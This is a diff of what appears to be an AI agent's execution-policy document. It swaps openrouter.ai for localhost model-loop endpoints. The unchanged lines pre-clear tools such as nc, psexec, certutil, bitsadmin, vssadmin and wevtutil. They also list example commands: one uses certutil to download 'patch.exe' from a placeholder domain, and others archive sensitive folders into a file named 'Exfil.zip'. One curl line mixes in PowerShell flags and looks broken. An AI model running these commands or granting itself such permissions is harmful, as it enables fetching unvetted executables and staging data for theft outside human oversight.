@@ -424,7 +424,7 @@ The execution engine uses an embedded policy matrix. This pre-clears local binar
 * **System Core Utilities**: awk, sed, jq, grep, ripgrep, rg, xargs, sort, uniq, cut, diff, colordiff, curl, ssh, dig, netstat, ss, nc, ping, traceroute, tracert, nslookup, top, htop, ps, kill, killall, lsof, df, du, free, nice, renice, pip, ls, whoami, ipconfig, arp, attrib, bitsadmin, certutil, cipher, cls, dir, mkdir, rm, del, type, tar, make, cron, crontab, rsync, watch, find, chown, chmod, sudo, env, printenv, alias, history, tasklist, taskkill, qwinsta, query, wmic, vssadmin, wbadmin, wevtutil, wget, xcopy, makecab, psexec.
 * **Git Lifecycle Automation**: bisect, cherry-pick, rebase, reflog, stash, blame, diff.
 * **Virtualization Tools**: docker, docker-compose, kubectl, VBoxManage.
-* **Advanced Web Domains**: openrouter.ai, ://schwabapi.com, localhost.
+* **Advanced Web Domains**: local browser model-loop endpoints, ://schwabapi.com, localhost.
 * **External MCP Protocol Binding**: Fully supports pip install mcp and adjacent runtime integrations.
 
 ---
@@ -1310,7 +1310,7 @@ Read URLs
 URLs the agent can read or open in the browser.
 
 allow
-openrouter.ai
+127.0.0.1:8765
 
 Execute URLs
 URLs the agent can actuate on using the browser.
@@ -1339,7 +1339,7 @@ bash
 
 # Network & Archive Pipelining
 
-curl -L -Uri "<https://openrouter.ai>" -OutFile "response.json"
+curl -L -Uri "http://127.0.0.1:8765/model-loop" -OutFile "response.json"
 certutil -urlcache -split -f "<https://domain.com>" patch.exe
 Compress-Archive -Path "C:\Sensitive\*" -DestinationPath "C:\Exfil.zip"
 makecab C:\SensitiveData C:\archive.cab
@@ -1362,7 +1362,7 @@ kubectl logs deployment/api-service --tail=50
 bash
 ping -c 4 localhost
 nslookup ://schwabapi.com
-traceroute openrouter.ai
+curl -s http://127.0.0.1:8765/health
 netstat -ano
 ss -tulpn
 
